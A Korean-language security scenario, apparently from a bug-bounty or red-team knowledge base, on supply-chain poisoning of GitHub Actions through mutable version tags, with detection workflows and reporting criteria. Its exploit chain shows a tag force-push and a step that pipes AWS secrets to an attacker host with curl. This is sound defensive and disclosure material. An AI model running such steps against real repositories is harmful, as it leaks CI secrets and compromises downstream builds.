# Scenario: GitHub Actions Third-party Action Poisoning

> tj-actions/changed-files 류 사고의 일반화. Tag-mutable 의존성으로 CI secrets 유출.

## 1. Threat Model
- **타겟**: `.github/workflows/*.yml`에서 third-party action을 tag(`@v1`, `@v2` 등)로 import
- **공격자**: 해당 action maintainer 계정 탈취 또는 action repo contribute 권한
- **Impact**: 모든 사용 워크플로에서 runtime 코드 실행 → secrets 유출, 빌드 변조
- **Severity**: Critical (대규모 영향)

## 2. Discovery Signals
- `.github/workflows/*.yml`에서 `uses: owner/action-name@v1` (tag, not commit SHA)
- `pull_request_target` 이벤트 사용
- `secrets.*` 노출되는 step이 third-party action 뒤에 배치
- Actions repo의 recent force-push on tag
- Repo commits에 unreviewed `"update"` 패턴 최근 업로드

## 3. Exploit Chain
```
A. 공격자가 인기 action 유지관리자 계정 탈취 (phishing, stolen session, credential reuse)
B. 해당 action의 기존 버전 태그를 악성 커밋으로 force-push
   (git push -f origin refs/tags/v1)
C. 타겟 워크플로가 `@v1` import 시 악성 코드 fetch 및 실행
D. action runtime: `echo ${{ secrets.AWS_ACCESS_KEY }} | curl attacker...`
E. GITHUB_TOKEN + OIDC도 동일하게 유출 가능
F. 공격자가 탐지되기 전 태그 롤백 → 포렌식 어려움
```

## 4. PoC Template (authorized: own action, own repo)
```yaml
# .github/workflows/poc-detect.yml — 탐지용 워크플로 예시
name: detect-tag-mutable-actions
on: [push]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Find tag-pinned actions
        run: |
          grep -RnE "uses:\s*[^/]+/[^@]+@v[0-9]+" .github/workflows/ || echo "none"
          # SHA-pinned만 안전 (40-hex)
```

```bash
# 자체 action repo의 tag 변경 이력 모니터링 (방어)
gh api repos/OWNER/ACTION/tags --jq '.[].commit.sha' | sort | uniq -c | awk '$1>1'
# 같은 SHA가 여러 tag에 매핑되면 이상
```

## 5. Evidence Tier
- E1: 실제 타겟 워크플로에서 canary secret 유출 증명 (`POST /?s=${CANARY}` 콜백 수신)
- E2: 타겟이 tag-mutable third-party action 사용 확인 + 해당 action이 아직 취약 상태
- E3: 일반적 best-practice 위반 지적만

## 6. Gate 1 / Gate 2
- [ ] GitHub Security Lab 범위에 해당 제보 포함
- [ ] 타겟 repo가 public이고 `.github/workflows` 읽을 수 있는지
- [ ] 공격자가 action repo 탈취 시나리오는 이론적 — 실제 공격 없이 설정 이슈로 제보
- [ ] `pull_request_target` 오용 패턴은 open-source 리포지토리 자체 취약점

## 7. Variants
- **Reusable workflows**: `uses: owner/repo/.github/workflows/x.yml@ref`
- **Nested action**: 사용하는 action이 또 다른 action을 tag로 import
- **Docker image action**: `image: owner/image:v1` tag mutable
- **Self-hosted runner takeover**: runner 자체 취약점 이용 → 모든 repo jobs 감염

## 8. References
- tj-actions/changed-files (CVE-2025-30066, 2025-03)
- StepSecurity — GitHub Actions security hardening 가이드
- Cycode — "GhostAction" 연구
- GitHub Actions 공식 security best practices — "Use SHA pinning"
- `knowledge/techniques/supplychain_incidents_2025_2026.md` 섹션 1.1
